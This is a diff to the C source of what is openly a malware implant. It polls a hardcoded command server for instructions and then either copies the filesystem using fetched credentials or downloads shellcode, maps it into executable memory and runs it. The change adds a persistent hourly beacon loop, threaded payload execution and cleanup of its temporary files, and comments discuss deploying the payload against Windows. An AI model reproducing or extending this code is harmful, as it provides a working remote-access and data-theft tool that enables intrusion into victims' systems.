@@ -8,14 +8,15 @@
 #include <time.h>
 #include <unistd.h>
 #include <sys/mman.h>
+#include <pthread.h>
 
 // Author: Ezra Fast
 
 /* COMPILATION: 				--> Compiling with header files turned into a nightmare, enjoy this monolithic beast!
  * sudo apt install libcurl4-openssl-dev
- * gcc main.c -o main -s -lcurl
+ * gcc main.c -o main -s -lcurl -lpthread
 */
-/* COMPILATION FOR WINDOWS:		// Modules need to be tweaked if this is being deployed against windows. It compiles but has not been tested.
+/* COMPILATION FOR WINDOWS:		// This source code needs to be tweaked to deploy the payload against Windows. Specifically the functionality related to threading and memory allocation
  * 
  * gcc .\linux-main.c -o .\linux-main -IC:\curl\include\curl C:\curl\lib\libcurl.dll.a --static
  *	- obtain curl from the following link: https://curl.se/windows/
@@ -72,33 +73,39 @@ char * takePassword(void);
 char * cleanString(char * string);
 void generateRandomSequence(char * buffer);
 char * replaceSpaces(char * string);
-void ExecutePayload(void);
+void * ExecutePayload(void * holder);
 
 // Globals:
 
-char * CADDRESS = "http://10.243.19.163:8080/instruction.txt";
+char * CADDRESS = "http://192.168.0.19:8080/instruction.txt";
 char * USERNAMEADDRESS = "http://ADDRESS:PORT/username.txt"; 
 char * PASSWORDADDRESS = "http://ADDRESS:PORT/password.txt";
-char * SHELLCODEADDRESS = "http://10.243.19.163:8080/shellcode";
+char * SHELLCODEADDRESS = "http://192.168.0.19:8080/shellcode";
 char * BASEDIRECTORY = "/";
 
 // Main function:
 
 int main(void) {
 	
-	char * controllerDirective;
-	controllerDirective = takeControlInstruction();
-
-	if (strcmp(controllerDirective, "COPY") == 0) {
-		char * username = cleanString(takeUsername());
-		char * password = cleanString(takePassword());
-		Copy(BASEDIRECTORY, username, password);
-		system("rm tmp");
-		system("rm username");
-		system("rm password");
-	} else if (strcmp(controllerDirective, "EXEC") == 0) {
-		ExecutePayload();
-		system("rm tmp");
+	while(1) {
+		char * controllerDirective;
+		controllerDirective = takeControlInstruction();		
+		if (strcmp(controllerDirective, "COPY") == 0) {
+			char * username = cleanString(takeUsername());
+			char * password = cleanString(takePassword());
+			Copy(BASEDIRECTORY, username, password);
+			system("rm tmp");
+			system("rm username");
+			system("rm password");
+		} else if (strcmp(controllerDirective, "EXEC") == 0) {
+			pthread_t thread_id;
+			pthread_create(&thread_id, NULL, ExecutePayload, NULL);			// Creating the thread
+			pthread_join(thread_id, NULL);						// Waiting for the thread to complete
+			// ExecutePayload();
+			printf("After thread\n");
+			system("rm tmp");
+		}
+		sleep(3600);
 	}
 
 	return 0;
@@ -326,7 +333,7 @@ size_t writeCallback(char * pointer, size_t size, size_t nmemb, void * userdata)
 	return size * nmemb;
 }
 
-void ExecutePayload(void) {			// This function works by grabbing the shellcode, creating memory, filling that memory, and executing a function that points to that memory
+void * ExecutePayload(void* holder) {			// This function works by grabbing the shellcode, creating memory, filling that memory, and executing a function that points to that memory
 	
 	CURL * curl;
 	CURLcode res;
